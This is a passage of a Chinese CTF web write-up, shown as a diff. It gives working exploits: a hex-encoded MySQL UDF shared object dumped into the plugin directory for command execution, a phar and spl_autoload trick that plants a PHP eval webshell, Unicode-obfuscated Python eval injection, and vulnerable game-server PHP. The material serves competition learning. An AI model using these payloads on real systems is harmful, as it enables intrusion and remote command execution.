class="number">-1</span>].encode(<span class="string">&#x27;hex&#x27;</span>) </span><br><span class="line">	  pay1 = query_length + <span class="string">&quot;0003&quot;</span> + query </span><br><span class="line">	  final = encode(auth + pay1 + <span class="string">&quot;0100000001&quot;</span>) </span><br><span class="line">	  <span class="keyword">return</span> final </span><br><span class="line">	<span class="keyword">else</span>: </span><br><span class="line">	  <span class="keyword">return</span> encode(auth) </span><br><span class="line"><span class="keyword">print</span> get_payload(query)</span><br></pre></td></tr></table></figure>
+
+<p>写shell发现写不进去限制了写入的位置/usr/lib/mysql/plugin/，就是插件位置利用UDF提权</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/udf/">国光大师傅提供了payload</a></p>
+<p>udf64 linux</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>绑定so文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">&#x27;udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后利用sys_eval命令执行，操作可参考<a target="_blank" rel="noopener" href="https://www.penson.top/article/av37#toc-heading-4">ByteCTF 2021 Final SEO WP | penson</a></p>
+<p>(比赛中早就想到这个思路但是我们本地测127.0.0.1一直3306显示没有打开，我们认为是自己的问题，然后利用file协议读了/etc/hosts获取了内网ip，然后读了D段上其他好多ip3306是开着的</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224208-266227.png" alt="Untitled"></p>
+<p>但是我们重启了几次靶机ip都是36我们也不知道是不是题目就是这么设置，</p>
+<p>然后找了其他的3306起的打了一下发现读到100的flag</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224209-592011.png" alt="Untitled"></p>
+<p>就猜可能是我们题目环境出问题了，最后问了主办方发现好像因为资源满了导致mysql服务没起起来emmm)</p>
+<h2 id="SPL"><a href="#SPL" class="headerlink" title="SPL"></a>SPL</h2><p>比赛中没有做出来捏，赛后看着NULL的wp复现一下</p>
+<p>思路：spl_autoload+phar</p>
+<p>其中利用方法和强网杯rcefile利用方式类似</p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.cn/2022/08/2022-%E5%BC%BA%E7%BD%91%E6%9D%AF-web-%E9%83%A8%E5%88%86-writeup/#rcefile">https://exp10it.cn/2022/08/2022-强网杯-web-部分-writeup/#rcefile</a></p>
+<p>直接给了源码</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$upload = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&quot;ctf&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">mkdir($upload);</span><br><span class="line">chdir($upload);</span><br><span class="line">file_put_contents(<span class="string">&#x27;/index.php&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">spl_autoload_register($_GET[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; !preg_match(<span class="string">&#x27;/ph(p|t)|htaccess|user/is&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; !preg_match(<span class="string">&#x27;/&lt;\?/is&#x27;</span>, $_GET[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">    file_put_contents($_GET[<span class="string">&#x27;file&#x27;</span>], $_GET[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显问题应该在<code>spl_autoload_register</code>和<code>file_put_contents</code>两个函数的利用，但是<code>file_put_contents</code>过滤了<code>ph</code>等，无法直接写shell（<code>file_put_contents(&#39;/index.php&#39;, &#39;&#39;);</code></p>
+<p>感觉出题人本来应该是想写在当前目录为了不看到目录）</p>
+<p>首先是spl_autoload_register</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224216-667818.png" alt="Untitled"></p>
+<blockquote>
+<p>大概就是注册一个名为 <code>__autoload()</code> 的魔术方法，可以提供内置方法也可以是自己写的方法</p>
+<p>这里我们重点看下面的参数部分</p>
+<p>“如果没有提供任何参数，则自动注册 autoload 的默认实现函数spl_autoload()”</p>
+<p>遂查阅 <code>spl_autoload()</code></p>
+</blockquote>
+<p><code>spl_autoload()</code></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224219-264852.png" alt="Untitled"></p>
+<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731153724.png" alt="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731153724.png"></p>
+<p>简单来说就是一个类的自动加载器</p>
+<p>如果我们使用了没有被定义的类时, <code>spl_autoload()</code> 会默认在当前目录和 include paths 下包含 <code>[class].inc</code> 或者 <code>[class].php</code> 文件来试图加载这个类</p>
+<p><code>spl_autoload_register</code></p>
+<p>配上</p>
+<p><code>file_put_contents</code></p>
+<p>的过滤文件名不能是ph，文件内容不能包含&lt;?，而且<code>file_put_contents</code>是可以触发phar的，这样就可以调用不存在类了，我们让phar中的类名和写入的inc文件名一致就可以利用<code>spl_autoload()</code>去加载写入的inc</p>
+<p>思路这样：</p>
+<ol>
+<li>先利用<code>file_put_contents</code>在xxx.inc中写入webshell</li>
+<li>利用<code>file_put_contents</code>写入phar文件，里面的类名和xxx.inc文件名一致</li>
+<li>利用<code>file_put_contents</code>触发phar，利用<code>spl_autoload()</code>去加载xxx.inc</li>
+</ol>
+<p>首先写入xxx.inc，func使用内置函数不报错了</p>
+<p><code>?func=file_put_contents&amp;file=xxx.inc&amp;data=&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;</code></p>
+<p>然后本地生成phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxx</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">#这里需要注意，本题对写入内容过滤了&lt;?，平时设置stub一般都写得是&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> xxx();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>利用脚本get传入文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">params1 = &#123;</span><br><span class="line">    <span class="string">&#x27;func&#x27;</span>: <span class="string">&#x27;file_put_contents&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;./test1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: open(<span class="string">&#x27;./phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url,params=params1)</span><br><span class="line"><span class="comment"># #print(r.text)</span></span><br></pre></td></tr></table></figure>
+
+<p>然后利用phar和<code>spl_autoload</code>去触发xxx.inc</p>
+<p><code>?func=spl_autoload&amp;file=phar://./test1.phar/1.txt&amp;data=111</code></p>
+<p><code>POST:1=system(&quot;cat /Fl@g&quot;);</code></p>
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a><strong>calc</strong></h2><p>eval注入+魔改字符</p>
+<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/search?q=fullwidth#characters">https://www.compart.com/en/unicode/search?q=fullwidth#characters</a></p>
+<p>python一般计算都是用eval函数</p>
+<p>知道过滤字母和啥的，利用unicode魔改字符</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224222-733588.png" alt="Untitled"></p>
+<p>字母可以使用unicode编码，但是这些特殊字符</p>
+<p><code>&quot;&#39;_</code></p>
+<p>无法使用unicode字符</p>
+<p>可以通过bytes和list实现</p>
+<p><code>ｅｖａｌ(ｂｙｔｅｓ(ｌｉｓｔ(())))</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d3 = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> list(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)]</span><br><span class="line">str_encode = <span class="string">&quot;,&quot;</span>.join(map(str,d3))</span><br><span class="line">print(str_encode)</span><br><span class="line"><span class="comment">#95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,39,41,46,114,101,97,100,40,41</span></span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<p><code>calc=ｅｖａｌ(ｂｙｔｅｓ(ｌｉｓｔ((95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,39,41,46,114,101,97,100,40,41))))</code></p>
+<p>即可以获取flag了</p>
+<h1 id="GAME"><a href="#GAME" class="headerlink" title="GAME"></a>GAME</h1><p>D盾扫描漏洞文件<br>/server/game/BattleNetGateway.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> 	</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;interface.php&quot;</span>);</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;utils.php&quot;</span>);</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;BattleFunc.php&quot;</span>);</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;HeroFunc.php&quot;</span>);</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;BattleNetServices.php&quot;</span>);</span><br><span class="line">	define(<span class="string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!defined(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="keyword">if</span> (substr(PHP_OS, <span class="number">0</span>, <span class="number">3</span>) == <span class="string">&#x27;WIN&#x27;</span>) define(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;;&#x27;</span>); <span class="keyword">else</span> define(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;:&#x27;</span>);&#125;	</span><br><span class="line">	ini_set(<span class="string">&#x27;include_path&#x27;</span>,ini_get(<span class="string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="string">&quot;../&quot;</span>)); 	</span><br><span class="line">	</span><br><span class="line">	$param=$_POST;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($param))$param=$_GET;		</span><br><span class="line">	$from_uid=$param[<span class="string">&quot;from_uid&quot;</span>];	</span><br><span class="line">	$sign=$param[<span class="string">&quot;sign&quot;</span>];</span><br><span class="line">	$commandFunc=$param[<span class="string">&quot;commandFunc&quot;</span>];</span><br><span class="line">	$content=urldecode($param[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line">	$content_encoding=$param[<span class="string">&quot;content-encoding&quot;</span>];</span><br><span class="line">	<span class="comment">//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	</span><br><span class="line">	$ret=<span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) </span><br><span class="line">		$ret[]=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		$ret[]=<span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($content_encoding==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line">				$inputParams=explode(<span class="string">&quot;|&quot;</span>,$content);</span><br><span class="line">				<span class="keyword">if</span>(count($inputParams)==<span class="number">1</span>)&#123;</span><br><span class="line">					$inputParams=$inputParams[<span class="number">0</span>];</span><br><span class="line">				&#125;</span><br><span class="line">				$ret[]=$commandFunc($from_uid,$inputParams);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$inputParams=json_decode($content,<span class="literal">true</span>);</span><br><span class="line">				<span class="keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="number">1</span>)&#123;</span><br><span class="line">				     $inputParams=array_shift($inputParams);</span><br><span class="line">				&#125;</span><br><span class="line">				